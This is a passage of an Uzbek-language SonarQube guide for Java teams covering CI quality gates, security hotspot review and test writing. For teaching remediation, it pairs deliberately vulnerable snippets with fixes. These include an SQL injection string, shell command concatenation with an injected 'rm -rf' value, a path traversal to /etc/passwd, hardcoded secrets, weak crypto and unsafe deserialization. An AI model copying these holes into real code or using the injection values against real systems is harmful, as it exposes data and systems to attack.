</plugin>

<!-- Quality gate natijasini kutish: CI tahlildan keyin to'xtamasligi uchun -->
<properties>
  <sonar.qualitygate.wait>true</sonar.qualitygate.wait>
  <!-- Faqat yangi kod shartiga tayanamiz, eski qarz alohida reja -->
  <sonar.newCode.referenceBranch>main</sonar.newCode.referenceBranch>
</properties>
```

```yaml
# CI da tartib muhim: avval test va JaCoCo hisoboti, keyin sonar
jobs:
  tahlil:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0   # new code hisobi uchun to'liq tarix kerak
      - uses: actions/setup-java@v4
        with: { java-version: '21', distribution: 'temurin' }
      # verify JaCoCo report ni yaratadi, sonar uni o'qiydi
      - run: ./mvnw -B verify
      - run: ./mvnw -B sonar:sonar -Dsonar.qualitygate.wait=true
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
```

Eski qarzni saralash mezoni: `git log` dan o'zgarish chastotasini, Sonar dan cognitive complexity ni olib ikkisini ko'paytir. Yuqori ko'paytma bergan 10 fayl refactoring navbatining boshi. Hech kim tegmaydigan 300 ballik fayl kuta turadi, uni tuzatish xavfi foydadan katta.

| Mavzu | Oddiy yondashuv | Arxitektor yondashuvi |
|---|---|---|
| S3776 chegarasi | Chegarani 25 ga ko'tarish | Chegarani qoldirib, metodni bo'lish |
| Shart daraxti | Yana bitta `else if` qo'shish | Jadval yoki `Map` ga ko'chirish |
| `null` tekshiruvi | Butun tanani `if` ichiga olish | Guard clause va chegarada validatsiya |
| Yangi to'lov turi | `switch` ga case qo'shish | Yangi strategiya klassi qo'shish |
| Takrorlanish topildi | Darhol umumiy metodga chiqarish | Avval "bir sabab bilan o'zgaradimi" savoli |
| Generatsiya qilingan kod | `sonar.exclusions` bilan yopish | `sonar.cpd.exclusions` bilan faqat CPD ni yopish |
| Eski qarz | Hammasini bitta sprintda tuzatish | New code ni toza ushlash, qarzni chastota bilan saralash |
| Test takrorlanishi | Hamma `assert` ni helper ga yashirish | Fixture ni umumlashtirish, `assert` ni testda qoldirish |
| O'lchash | Faqat gate rangiga qarash | API dan metrikani olib trend kuzatish |
| Issue ni yopish | `//NOSONAR` qo'yish | Sababni izohlab `Accepted` holatiga o'tkazish |

Oxirgi ogohlantirish: `//NOSONAR` qoidani o'chiradi, lekin sababsiz qo'yilsa keyingi o'quvchi uchun qora quti. Ishlatish zarur bo'lsa, yonida nega kerakligini bir qatorda yoz. `//NOSONAR` sonining o'sishi texnik qarzning ishonchli signali.

### 15.12 Amalda qo'llash

- [ ] Loyihada `java:S3776` bo'yicha eng yuqori ballga ega 10 metodni API orqali chiqar va ro'yxatni jamoaga ko'rsat.
- [ ] Shu ro'yxatdan bitta metodni tanlab, uch qadamni ketma-ket qo'lla: mustaqil qismni ajratish, shart daraxtini jadvalga ko'chirish, guard clause bilan tekislash.
- [ ] Refactoring dan oldin o'sha metod uchun xatti harakatni qotiradigan testlarni yoz, keyingina kodni o'zgartir.
- [ ] `sonar.cpd.exclusions` ni generatsiya qilingan kod uchun to'g'ri sozla va `sonar.exclusions` bilan aralashtirilgan joylarni tekshirib tozala.
- [ ] Katta `switch` lardan birini strategiya xaritasiga aylantir va har strategiyaga alohida test yoz.
- [ ] CI da `sonar.qualitygate.wait=true` va `fetch-depth: 0` borligini tasdiqla, aks holda new code hisobi noto'g'ri chiqadi.
- [ ] `//NOSONAR` va `Accepted` holatidagi issue larni sanab chiq, sababsizlarini sababli qil yoki tuzat.
- [ ] O'zgarish chastotasi va cognitive complexity ko'paytmasi bo'yicha refactoring navbatini tuz va uni har chorakda yangila.

## 16. Security hotspot va vulnerability: tekshirish va tuzatish (Security Hotspots and Vulnerabilities)

Sonar hisobotida xavfsizlik ikki xil ro'yxatga bo'linadi va ko'p jamoa shu yerda chalkashadi. Vulnerability darhol tuzatishni talab qiladigan topilma, security hotspot esa odam qarori kutayotgan xavfli joy. Quality gate ularni ham boshqacha o'lchaydi: vulnerability soni nolga tenglashtiriladi, hotspot esa "ko'rib chiqilgan foizi" bilan baholanadi. Bu bo'lim har bir tipik hotspot uchun zaif kod va uning Sonar o'tadigan variantini ketma ket ko'rsatadi, hamda "safe" belgisini qanday asos bilan qo'yishni tushuntiradi.

### 16.1 Hotspot va vulnerability farqi: biri ko'rib chiqishni, biri tuzatishni talab qiladi

Vulnerability deganda Sonar kodda ekspluatatsiya qilinadigan yo'lni topgan holat tushuniladi. Masalan taint analysis foydalanuvchi kiritmasidan SQL so'roviga uzilmagan yo'l topsa, bu vulnerability bo'ladi. Uni "muhokama qilib" yopib qo'yish mumkin emas, kodni o'zgartirish kerak.

Security hotspot boshqa tabiatga ega. Bu "shu joyda xavfli API ishlatilgan, kontekstni bilmasdan hukm chiqarib bo'lmaydi" degan signal. `Random` ishlatilishi lotereya raqami uchun halokat, test ma'lumoti uchun esa mutlaqo normal. Shuning uchun Sonar o'zi qaror qilmaydi va odamga savol tashlaydi.

Amaliy natija quyidagicha. Vulnerability Issues ro'yxatiga tushadi, security rating ni pasaytiradi va "new code da 0 vulnerability" shartini buzadi. Hotspot alohida Security Hotspots bo'limida yashaydi, reytingga ta'sir qilmaydi, lekin "Security Hotspots Reviewed on New Code = 100%" shartini buzadi. Ya'ni hotspot ni e'tiborsiz qoldirish ham build ni qizartiradi, faqat tuzatish emas, balki asoslangan qaror talab qilinadi.

Yana bir farq: hotspot holatlari `To Review`, `Acknowledged`, `Fixed` va `Safe`. Vulnerability esa oddiy issue kabi `Open`, `Accepted` yoki `False Positive` bo'ladi. Yangi SonarQube liniyalarida nomlar va taksonomiya o'zgargan, shuning uchun UI dagi atama versiyaga qarab farq qiladi.

### 16.2 Hotspot ni ko'rib chiqish jarayoni: kim, qanday, qanday asos bilan

Hotspot ni ko'rib chiqish texnik emas, tashkiliy masala. Birinchi qoida: ko'rib chiqadigan odam kodni yozgan odam bo'lmasligi kerak bo'lsa ham, hech bo'lmaganda qarorni yozib qoldirishi shart. SonarQube da hotspot holatini o'zgartirish uchun `Administer Security Hotspots` ruxsati kerak, demak bu huquq kim kimga berilgani jamoada ochiq kelishilgan bo'lishi lozim.

Ikkinchi qoida: ko'rib chiqish pull request paytida bo'ladi, oyning oxirida emas. PR da paydo bo'lgan hotspot ni muallif tushuntiradi, reviewer esa tushuntirishni tekshiradi. Shunda kontekst yodda bo'ladi.

Uchinchi qoida: asos uchta savolga javob bersin. Ma'lumot qaydan keladi, kim boshqaradi, buzilsa nima yo'qoladi. "Bu yerda muammo yo'q" degan izoh asos emas.

| Vaziyat | Oddiy yondashuv | Arxitektor yondashuvi |
| --- | --- | --- |
| Hotspot paydo bo'ldi | Relizdan oldin ommaviy `Safe` bosiladi | PR ichida muallif asoslaydi, reviewer tasdiqlaydi |
| Ko'rib chiqish huquqi | Hammada admin huquqi bor | Ruxsat tor guruhda, qaror auditga tushadi |
| Asos matni | "Tekshirildi, OK" | Manba, nazorat, zarar uchligi yozilgan |
| SQL dinamikasi | `String` birlashtirish, keyin `Safe` | Parametr bind, tartiblash oq ro'yxatda |
| Sirlar | `application-prod.properties` repozitoriyada | Faqat `${ENV}` havolasi, qiymat vault da |
| Kripto tanlovi | "Ishlayapti, demak to'g'ri" | Algoritm va rejim siyosatda qulflangan |
| Bog'liqlik CVE si | Sonar aytmadi, demak toza | Alohida SCA vositasi CI da majburiy |
| Deserializatsiya | Qulay, shuning uchun qoldiriladi | Format JSON, DTO qat'iy, filtr oq ro'yxat |
| Loglar | Hamma narsa `toString` bilan yoziladi | Maskalash va kiritma tozalash standart |
| Reytingdan ortda | Gate ni yumshatish so'raladi | New code shartlari tegilmaydi, qarz rejalashtiriladi |

### 16.3 SQL in'ektsiya: zaif kod va parametrlangan so'rov bilan tuzatish

Sonar so'rov matni o'zgaruvchi bilan birlashtirilganini topsa, formatlangan SQL haqida ogohlantiradi, ko'p versiyada bu `java:S2077` hotspot i. Agar taint analysis kiritmadan so'rovgacha to'liq yo'lni ko'rsa, topilma vulnerability darajasiga ko'tariladi. Ikkinchi holatda muhokama tugaydi, faqat tuzatish qoladi.

Tuzatish qoidasi oddiy: qiymatlar hech qachon so'rov matniga qo'shilmaydi, ular parametr sifatida uzatiladi. Identifikator va tartiblash ustuni parametr bo'la olmaydi, shuning uchun ular oq ro'yxatdan tanlanadi.

```sql
-- Zaif: filtr qiymati to'g'ridan to'g'ri matnga qo'shilgan
-- "42' OR '1'='1" kiritmasi butun jadvalni ochib beradi
SELECT id, amount FROM payment WHERE status = 'NEW' AND merchant_id = '42' OR '1'='1';

-- Tuzatilgan: qiymat o'rnida placeholder, bind drayver tomonda bo'ladi
SELECT id, amount FROM payment WHERE status = ? AND merchant_id = ?;

-- Tartiblash uchun ustun nomi ham tashqaridan kelmaydi, oq ro'yxatdan keladi
SELECT id, amount FROM payment WHERE merchant_id = ? ORDER BY created_at DESC;
```

```java
// Zaif: so'rov matni foydalanuvchi kiritmasi bilan birlashtirilgan
public List<Payment> findBad(String status) {
    String sql = "SELECT * FROM payment WHERE status = '" + status + "'";
    return jdbc.query(sql, new PaymentRowMapper()); // Sonar: injection yo'li ochiq
}

// Tuzatilgan: qiymat bind qilinadi, ustun nomi faqat oq ro'yxatdan olinadi
private static final Map<String, String> SORT =
        Map.of("date", "created_at", "amount", "amount");

public List<Payment> find(PaymentStatus status, String sortKey) {
    String column = SORT.getOrDefault(sortKey, "created_at"); // tashqi matn emas
    String sql = "SELECT id, amount, status FROM payment WHERE status = ? ORDER BY "
            + column + " DESC";
    return jdbc.query(sql, new PaymentRowMapper(), status.name());
}

// JPA da nomlangan parametr: matn birlashtirishga umuman o'rin qolmaydi
@Query("select p from Payment p where p.status = :status and p.amount > :min")
List<Payment> findRisky(@Param("status") PaymentStatus status,
                        @Param("min") BigDecimal min);
```

Diqqat qiling: `Statement` o'rniga `PreparedStatement` ishlatish o'zi yetarli emas. Agar so'rov matni baribir birlashtirilsa, `PreparedStatement` hech narsani qutqarmaydi. Sonar ham aynan matn qurilishiga qaraydi, klass nomiga emas.

### 16.4 Komanda bajarish va yo'l bilan ishlashdagi xavflar

`Runtime.exec` va `ProcessBuilder` ga tashqi matn tushishi Sonar da OS komanda in'ektsiyasi hotspot ini yoqadi, ko'p versiyada `java:S2076` qoidasi. Eng xavfli naqsh: komandani bitta satr sifatida `sh -c` ga berish. Shunda `;` yoki `&&` belgisi yangi komanda qo'shadi.

Yo'l bilan ishlashda esa katalogdan chiqib ketish muammosi bor. Fayl nomi `../../etc/passwd` bo'lsa, oddiy birlashtirish hisobot katalogidan tashqariga olib chiqadi.

```java
// Zaif: hisobot nomi shell ga uzatilgan, ";rm -rf /" qo'shib yuborish mumkin
Runtime.getRuntime().exec("sh -c 'gzip /var/report/" + name + "'");

// Zaif: yo'l birlashtirish, "../.." bilan katalogdan chiqib ketiladi
File f = new File("/var/report/" + name);

// Tuzatilgan: shell yo'q, argumentlar alohida elementlar sifatida beriladi
ProcessBuilder pb = new ProcessBuilder("gzip", "--", resolveReport(name).toString());
pb.redirectErrorStream(true);
Process process = pb.start();

private static final Path BASE = Paths.get("/var/report").toAbsolutePath().normalize();

// Tuzatilgan: normalize va baza katalog ichida ekanini majburiy tekshirish
private Path resolveReport(String name) {
    Path candidate = BASE.resolve(name).normalize();
    if (!candidate.startsWith(BASE)) {
        throw new IllegalArgumentException("yo'l ruxsat etilgan katalogdan tashqarida");
    }
    return candidate;
}
```

Eng yaxshi tuzatish esa komandani butunlay olib tashlash. Arxivlash uchun JVM ichida `GZIPOutputStream` bor, tashqi protsess kerak emas. Hotspot yo'qolsa, uni ko'rib chiqish ham kerak bo'lmaydi.

### 16.5 Maxfiy ma'lumot kodda: kalit, parol, token va ularni tashqariga chiqarish

Qattiq yozilgan ma'lumotlar uchun Sonar da `java:S2068` qoidasi bor, u parol va shunga o'xshash nomli maydonlarni topadi. Buning ustiga SonarQube ning yangi liniyalarida alohida secret detection qoidalari ishlaydi va ular token shablonini naqsh bo'yicha aniqlaydi. Lekin hech bir skaner barcha sirni topa olmaydi, shuning uchun siyosat kerak: konfiguratsiyada faqat havola bo'ladi.

```properties
# Zaif: parol va token repozitoriyada, Sonar ham hotspot ko'taradi
spring.datasource.password=Pr0d_Pass_2025
payments.api.token=sk_live_8f3a91c2

# Tuzatilgan: faqat havola, qiymat muhit o'zgaruvchisi yoki vault dan keladi
spring.datasource.password=${DB_PASSWORD}
payments.api.token=${PAYMENTS_API_TOKEN}

# Mahalliy ishga tushirish uchun namuna fayl saqlanadi, qiymatlari bo'sh
# application-local.properties.example
```

```bash
# Faylni kuzatuvdan chiqarish yetarli emas, qiymat git tarixida qoladi
git rm --cached src/main/resources/application-prod.properties
echo "**/application-prod.properties" >> .gitignore

# Tarixdagi sirni alohida skaner qidiradi, bu Sonar vazifasi emas
gitleaks detect --source . --redact

# Sonar tahlili hotspot larni ham hisobotga qo'shadi
mvn -B verify sonar:sonar -Dsonar.projectKey=payments -Dsonar.host.url="$SONAR_URL"

# Eng muhim qadam: oshkor bo'lgan kalitni provayderda darhol bekor qilish
```

Sir oshkor bo'lganda tartib shunday: avval rotatsiya, keyin kodni tozalash, oxirida hotspot ni yopish. Teskari tartib xavfni saqlab qoladi, chunki eski kalit baribir ishlayveradi.

### 16.6 Kriptografiya: zaif algoritm, tasodifiy son manbasi, qattiq yozilgan kalit

Kripto bo'limida Sonar bir nechta hotspot ni yoqadi: zaif hash funksiyasi, ishonchsiz shifr rejimi, prognoz qilinadigan tasodifiy son generatori va qattiq yozilgan kalit. Tasodifiy son uchun `java:S2245` qoidasi `java.util.Random` ishlatilganini belgilaydi. Bu hotspot, chunki test ma'lumoti uchun `Random` normal, OTP uchun esa halokatli.

```java
// Zaif: MD5 hash, ECB rejimi, prognoz qilinadigan Random, kod ichidagi kalit
MessageDigest md = MessageDigest.getInstance("MD5");        // zaif hash
Cipher weak = Cipher.getInstance("AES/ECB/PKCS5Padding");   // bir xil blok, bir xil natija
String otp = String.valueOf(new Random().nextInt(999999));  // seed taxmin qilinadi
byte[] key = "0123456789abcdef".getBytes(UTF_8);            // repozitoriyadagi kalit

// Tuzatilgan: parol uchun BCrypt, hash uchun SHA-256, OTP uchun SecureRandom
PasswordEncoder encoder = new BCryptPasswordEncoder(12);
String stored = encoder.encode(rawPassword);

byte[] iv = new byte[12];
SecureRandom random = SecureRandom.getInstanceStrong();
random.nextBytes(iv);                                       // har shifrlashga yangi IV

Cipher gcm = Cipher.getInstance("AES/GCM/NoPadding");       // autentifikatsiyali rejim
gcm.init(Cipher.ENCRYPT_MODE, keyFromVault(), new GCMParameterSpec(128, iv));

int otpValue = random.nextInt(900_000) + 100_000;           // 6 xonali, kuchli manba
```

Uchta amaliy qoida yodda tursin. Parolni shifrlamaydi, uni sekin hash bilan saqlaydi. ECB rejimi bir xil ochiq blokni bir xil shifrga aylantiradi, shuning uchun rasm ham tanib olinadi. IV tasodifiy va har safar yangi bo'lishi shart, aks holda GCM ham sinadi.

### 16.7 Deserializatsiya va ishonchsiz ma'lumotni qayta tiklash

Java serializatsiyasi tashqi baytlardan ob'ekt tiklaganda, `readObject` ichidagi kod ishga tushadi. Shu sababli ma'lum kutubxonalar zanjiri bilan remote code execution mumkin bo'ladi. Sonar bu joyni hotspot sifatida belgilaydi, Jackson da ochiq polimorfizm yoqilgan holatni ham shunday baholaydi.

```java
// Zaif: HTTP tanasidan to'g'ridan to'g'ri ob'ekt tiklash
try (ObjectInputStream in = new ObjectInputStream(request.getInputStream())) {
    OrderCommand cmd = (OrderCommand) in.readObject();   // gadget zanjiri ishlaydi
}

// Zaif: Jackson da har qanday klassga ruxsat beradigan default typing
ObjectMapper bad = new ObjectMapper();
bad.activateDefaultTyping(LaissezFaireSubTypeValidator.instance);

// Tuzatilgan: JSON va qat'iy DTO, tur ma'lumoti tashqaridan kelmaydi
ObjectMapper mapper = JsonMapper.builder().build();        // default typing yoqilmaydi
OrderCommand cmd = mapper.readValue(body, OrderCommand.class);

// Agar Java serializatsiyasi majburiy bo'lsa, oq ro'yxat filtri qo'yiladi
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
        "com.shop.order.OrderCommand;java.lang.*;java.util.*;!*");  // qolgani rad
ObjectInputStream in = new ObjectInputStream(stream);
in.setObjectInputFilter(filter);
```

Yechimning asosiy mohiyati format tanlovida. Tashqi chegarada Java serializatsiyasi o'rniga JSON yoki Protobuf ishlatilsa, hotspot umuman tug'ilmaydi. Ichki kesh va sessiya uchun ham shu qoida amal qiladi, chunki keshga yozish huquqini olgan hujumchi zanjirni shu yerdan ishga tushiradi.

### 16.8 Spring Security bilan bog'liq ogohlantirishlar: ochiq endpoint, CSRF, CORS

Spring konfiguratsiyasida uchta hotspot eng ko'p uchraydi. CSRF himoyasini o'chirish uchun `java:S4502`, keng CORS siyosati uchun `java:S5122` qoidalari ishlaydi. Uchinchisi qoida bilan emas, arxitektura bilan topiladi: `permitAll` ni oxirgi qoida qilib qo'yish.

```java
// Zaif: hamma narsa ochiq, CSRF o'chirilgan, CORS hammaga ruxsat bergan
http.csrf(csrf -> csrf.disable())
    .cors(c -> c.configurationSource(allowAllOrigins()))
    .authorizeHttpRequests(a -> a.anyRequest().permitAll());

// Tuzatilgan: default deny, aniq ro'yxat, CSRF sababli o'chirilgan
@Bean
SecurityFilterChain apiChain(HttpSecurity http) throws Exception {
    http.securityMatcher("/api/**")
        // Sababi: stateless JWT, sessiya cookie ishlatilmaydi, CSRF vektori yo'q
        .csrf(AbstractHttpConfigurer::disable)
        .sessionManagement(s -> s.sessionCreationPolicy(STATELESS))
        .cors(c -> c.configurationSource(strictCors()))   // origin aniq ro'yxatda
        .authorizeHttpRequests(a -> a
            .requestMatchers("/api/public/**").permitAll()
            .requestMatchers("/api/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated())                // oxirgi qoida rad etadi
        .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()));
    return http.build();
}
```

```yaml
# Zaif: barcha actuator endpoint ochiq, origin yulduzcha bilan berilgan
management:
  endpoints:
    web:
      exposure:
        include: "*"
      cors:
        allowed-origins: "*"

# Tuzatilgan: alohida port, faqat kerakli endpoint, nozik ma'lumot yopiq
management:
  server:
    port: 9001                 # tashqi trafikdan ajratilgan port
  endpoints:
    web:
      exposure:
        include: health,info,prometheus
  endpoint:
    health:
      show-details: when-authorized
```

CSRF ni o'chirishdan oldin bitta savolga javob bering: brauzer so'rovga avtomatik cookie qo'shadimi. Javob "yo'q" bo'lsa, o'chirish asoslangan va shuni hotspot izohiga yozasiz. Javob "ha" bo'lsa, o'chirish vulnerability ga teng.

### 16.9 Loglarda maxfiy ma'lumot va foydalanuvchi kiritmasini loglash

Loglar nozik ma'lumot oqib chiqadigan eng sokin kanal. Karta raqami, token va shaxsiy ma'lumot log faylga tushsa, u keyin markazlashgan log tizimiga, keyin backup ga ketadi. Ikkinchi muammo log injection: foydalanuvchi matnidagi yangi qator belgisi yolg'on log yozuvi yasaydi va auditni chalg'itadi.

```java
// Zaif: karta raqami, token va tozalanmagan foydalanuvchi matni loglangan
log.info("to'lov: card={} token={} comment={}", card.number(), token, req.comment());

// Zaif: butun obyektni toString bilan yozish, ichidagi hamma narsa chiqadi
log.debug("so'rov: {}", paymentRequest);

// Tuzatilgan: identifikator, maskalangan raqam, tozalangan matn
log.info("to'lov: paymentId={} cardMask={} merchant={} comment={}",
        payment.id(), mask(card.number()), payment.merchantId(), safe(req.comment()));

// Oxirgi to'rt raqamdan boshqasi ko'rinmaydi
private static String mask(String number) {
    return "****" + number.substring(number.length() - 4);
}

// Yangi qator belgisi yolg'on yozuv yasashini to'sadi
private static String safe(String input) {
    return input == null ? "-" : input.replaceAll("[\\r\\n]", "_");
}
```

Tizimli yechim: nozik maydonlarni loglash imkonsiz qilib qo'yish. `record` ichida `toString` ni qo'lda yozib, parol va karta o'rniga yulduzcha qaytaring. Shunda kelgusi developer e'tiborsizlik bilan ham sirni chiqarib yubora olmaydi.

### 16.10 Bog'liqliklardagi zaifliklar va ularni alohida vosita bilan tekshirish

Bu yerda eng ko'p yanglishish bor: SonarQube Community nashri bog'liqliklardagi CVE ni qidirmaydi. U sizning kodingizni tahlil qiladi, kutubxona versiyalarini zaiflik bazasiga solishtirmaydi. Sonar ning tijorat liniyalarida SCA imkoniyatlari qo'shilgan, lekin bu nashrga va versiyaga qarab farq qiladi. Demak gate yashil bo'lsa ham, zaif `jackson-databind` loyihada turishi mumkin.

```xml
<!-- Bog'liqlik zaifliklari uchun alohida vosita: Sonar bu ishni qilmaydi -->
<plugin>
  <groupId>org.owasp</groupId>
  <artifactId>dependency-check-maven</artifactId>
  <version>${dependency-check.version}</version> <!-- versiyani loyihada qulflang -->
  <configuration>
    <!-- Yuqori xavfli CVE build ni to'xtatadi -->
    <failBuildOnCVSS>7</failBuildOnCVSS>
    <suppressionFiles>
      <suppressionFile>owasp-suppressions.xml</suppressionFile>
    </suppressionFiles>
  </configuration>
  <executions>
    <execution>
      <goals><goal>check</goal></goals>
    </execution>
  </executions>
</plugin>
```

```bash
# Zaif versiya qaysi bog'liqlik orqali kelganini topish
mvn dependency:tree -Dincludes=com.fasterxml.jackson.core:jackson-databind

# Tekshiruvni CI da majburiy qadam qilish va hisobotni artefakt sifatida saqlash
mvn -B verify
ls target/dependency-check-report.html

# Suppression har doim muddat va sabab bilan yoziladi, aks holda abadiy qoladi
grep -c "<suppress" owasp-suppressions.xml
```

| Tuzoq | Nima bo'ladi | Yechim |
| --- | --- | --- |
| "Sonar yashil, demak xavfsiz" | Bog'liqlik CVE si ko'rinmaydi | CI da alohida SCA qadami majburiy |
| Hotspot lar ommaviy `Safe` | Haqiqiy zaiflik yo'qoladi | Faqat PR ichida, asos matni bilan |
| CSRF ko'r ko'rona o'chirilgan | Sessiyali endpoint himoyasiz | Cookie bor joyda yoqiladi, yo'q joyda sabab yoziladi |
| Sir `.gitignore` ga qo'shildi | Qiymat tarixda qoladi | Rotatsiya, keyin tarixni skanerlash |
| `Random` OTP uchun | Kod taxmin qilinadi | `SecureRandom.getInstanceStrong()` |
| Suppression fayli o'smoqda | Zaiflik yashiriladi | Har yozuvga sabab va muddat |
| Taint analysis cheklangan | Oraliq metod orqali yo'l ko'rinmaydi | Chegarada validatsiya, ichkarida ishonch |

### 16.11 Hotspot ni "safe" deb belgilash: asosni qanday yozish

`Safe` belgisi texnik harakat emas, yozma qaror. Yaxshi asos uch narsani aytadi: ma'lumot manbasi, nazorat mexanizmi va buzilganda yuzaga keladigan zarar. Yomon asos esa "bu ichki servis" degan bitta jumla bo'ladi, chunki ichki servis ham bir kun tashqariga chiqadi.

```bash
# Hotspot holatini odatda UI dan o'zgartiradilar, API ham mavjud
curl -u "$SONAR_TOKEN:" -X POST "$SONAR_URL/api/hotspots/change_status" \
  -d "hotspot=AY9kQ2mXbVr7TzLp" \
  -d "status=REVIEWED" \
  -d "resolution=SAFE" \
  -d "comment=Manba: ustun nomi faqat SORT oq ro'yxatidan olinadi, HTTP kiritma \
emas. Nazorat: getOrDefault noma'lum kalitni created_at ga tushiradi, test \
PaymentRepositoryTest#rejectsUnknownSortKey buni qulflaydi. Zarar: ro'yxat \
tartibi o'zgaradi, ma'lumot oqmaydi. Ko'rib chiqdi: platform-security, 2026-02."

# Hotspot larning joriy holatini hisobotga chiqarish
curl -s -u "$SONAR_TOKEN:" "$SONAR_URL/api/hotspots/search?projectKey=payments&status=TO_REVIEW"
```

Asosni mustahkamlaydigan bitta usul bor: qarorni test bilan qulflash. Agar `Safe` deb yozgan sababingiz "ustun nomi oq ro'yxatdan keladi" bo'lsa, shu xatti harakatni tekshiradigan test yozing. Test o'chsa, asosingiz ham o'z kuchini yo'qotadi va jamoa buni darhol ko'radi. Test yozish texnikasi bo'yicha testlash qo'llanmasidagi birlik test va chegara holatlari mavzusiga qarang.

Oxirgi ogohlantirish halollik uchun. "Hamma hotspot ko'rib chiqilgan" degani "kod xavfsiz" degani emas. Sonar faqat o'zi taniydigan naqshlarni ko'rsatadi, biznes mantiqidagi avtorizatsiya xatosini u topmaydi. Shuning uchun hotspot jarayoni xavfsizlik ishini almashtirmaydi, uning eng arzon qismini avtomatlashtiradi.

### 16.12 Amalda qo'llash

- [ ] Loyihada `Security Hotspots Reviewed on New Code = 100%` sharti gate da borligini tekshir va yo'q bo'lsa qo'sh.
- [ ] Hozirgi `To Review` hotspot larini API bilan ro'yxatga chiqar, har biriga javobgar odam belgilab chiq.
- [ ] Hotspot holatini o'zgartirish ruxsatini tor guruhga cheklab, jamoada kelishuvni yozma qayd qil.
- [ ] Barcha SQL joylarini audit qilib, matn birlashtirishni parametr bind va ustun oq ro'yxatiga o'tkaz.
- [ ] Repozitoriyadagi sirlarni `gitleaks` bilan skanerlab, topilganini avval provayderda bekor qil, keyin kodni tozala.
- [ ] `java.util.Random` va `MD5` ishlatilgan barcha joyni toping, xavfsizlikka tegishli bo'lsa `SecureRandom` va BCrypt ga o'tkazing.
- [ ] CI pipeline ga OWASP Dependency-Check yoki shunga teng SCA qadamini majburiy qilib qo'sh, hisobotni artefakt sifatida saqla.
- [ ] Nozik `record` va entity larga maskalangan `toString` yozib, log orqali sir chiqishini kodda imkonsiz qil.


# V. Sonar o'tadigan test

## 17. Sonar talablarini qondiradigan test yozish (Writing Tests That Satisfy Sonar)

Sonar testni ikki tomondan ko'radi. Birinchi tomon: test ishlab chiqarish kodining qancha qatorini va qancha shoxini ishga tushirdi, ya'ni coverage raqami. Ikkinchi tomon: testning o'zi ham tahlil qilinadigan kod, unda ham issue chiqadi. Shu ikki tomonni bir vaqtda qondirmasa, quality gate yoki coverage shartida yoki test fayllaridagi issue sababli yiqiladi. Bu bobda har bir mavzu ayni shu ikki tomon bilan bog'lanadi, test yozish asoslari esa testlash qo'llanmasiga qoldiriladi.

### 17.1 Test nimani qamrashi kerak: ishlab chiqarish kodining har bir yo'li

Sonar coverage ni o'zi o'lchamaydi, uni JaCoCo hisobotidan oladi. JaCoCo esa ikki narsani sanaydi: bajarilgan qatorlar va bajarilgan shoxlar. Shox degani `if`, `else`, `&&`, `||`, `?:`, `switch` tarmoqlari va `catch` bloklari. Shuning uchun "qator qamrovi 100%" bo'lib, "shox qamrovi 60%" bo'lishi juda oson. Quality gate odatda `New Code` ustida coverage talab qiladi, ya'ni faqat o'zgargan qatorlar hisoblanadi.

Quyidagi metod bitta test bilan 100% line coverage beradi, lekin shoxlarning yarmi ishga tushmaydi.

```java
// To'lov komissiyasini hisoblaydi. Uchta shart, demak kamida uchta shox juftligi.
public BigDecimal komissiya(Tolov tolov) {
    BigDecimal stavka = new BigDecimal("0.02");
    if (tolov.summa().compareTo(new BigDecimal("1000000")) > 0) {
        stavka = new BigDecimal("0.01"); // yirik to'lovga chegirma
    }
    if (tolov.valyuta() != Valyuta.UZS) {
        stavka = stavka.add(new BigDecimal("0.005")); // valyuta ustamasi
    }
    return tolov.summa().multiply(stavka);
}
```

Bu metodni qoplash uchun kamida to'rt holat kerak: kichik UZS, yirik UZS, kichik valyuta, yirik valyuta. Qoida sodda: har bir `if` ikki yo'l, har bir `&&` yana bitta shox, har bir `catch` alohida yo'l. Agar shoxni testda ataylab yurgizib bo'lmasa, bu kodning o'zida o'lik shart borligini ko'rsatadi va uni olib tashlash kerak, test yozib o'tirish emas.

```java
@Test
void yirikValyutaTolovigaIkkiOzgarishHamQollanadi() {
    Tolov tolov = new Tolov(new BigDecimal("2000000"), Valyuta.USD);
    // 0.01 chegirma + 0.005 ustama = 0.015 stavka
    assertEquals(new BigDecimal("30000.000"), servis.komissiya(tolov));
}
```

### 17.2 Testni qamrov uchun emas, xatti-harakat uchun yozish tamoyili

Coverage raqami oson aldanadi. Metodni chaqirib, natijaga qaramaslik ham qamrov beradi. Sonar bu holatni to'liq ushlay olmaydi, chunki u mantiqni tushunmaydi. Shu sababli coverage raqamiga ishonib, assertion ni yengil qilish quality gate ni o'tkazadi, ammo xatoni o'tkazib yuboradi. Bu hujjat boshida aytilgan halol gapning amaliy ko'rinishi: 100% coverage sifatni kafolatlamaydi.

Ishonchli mezon bitta. Har bir test uchun o'zingdan so'ra: ishlab chiqarish kodining mantiqini buzsam, bu test qizil bo'ladimi. Agar yo'q bo'lsa, u test emas, u faqat qamrov yig'adigan chaqiruv.

```java
// Yomon: qamrov bor, lekin mantiq buzilsa ham yashil qoladi.
@Test
void hisobotYaratiladi() {
    servis.hisobotYarat(2025, 10); // natija tekshirilmaydi
}

// Sonar o'tadigan va foydali: kutilgan xatti-harakat qayd etilgan.
@Test
void oyHisobotidaFaqatShuOyningBuyurtmalariBoladi() {
    Hisobot h = servis.hisobotYarat(2025, 10);
    assertEquals(2, h.qatorlar().size());
    assertEquals(new BigDecimal("450000"), h.jamiSumma());
}
```

### 17.3 Bitta test bitta xatti-harakatni tekshirsin

Sonar test metodining ichidagi cognitive complexity ni ham o'lchaydi, chunki `java:S3776` qoidasi fayl turiga qarab yumshamaydi. Ichida besh marta `if` va ikki marta tsikl bo'lgan test metodi shu qoida bilan issue oladi. Bundan tashqari bir metodda o'nta assertion bo'lsa, birinchi assertion yiqilganda qolgani ishga tushmaydi va siz nima buzilganini bilmaysiz.

Amaliy natija: tsikl va shart test ichida bo'lmasin, ular parametrik testga chiqadi. Bitta metodda bitta holat tekshiriladi, holatlar soni ko'p bo'lsa metodlar soni ko'payadi, murakkablik emas.

```java
// Yomon: bitta metodda uchta mustaqil qoida, ichida shart bor.
@Test
void omborQoldigiTekshiruvi() {
    for (int i = 0; i < 3; i++) {
        Mahsulot m = servis.topish(i);
        if (m.qoldiq() > 0) {
            assertTrue(m.sotuvdaMi());
        } else {
            assertFalse(m.sotuvdaMi());
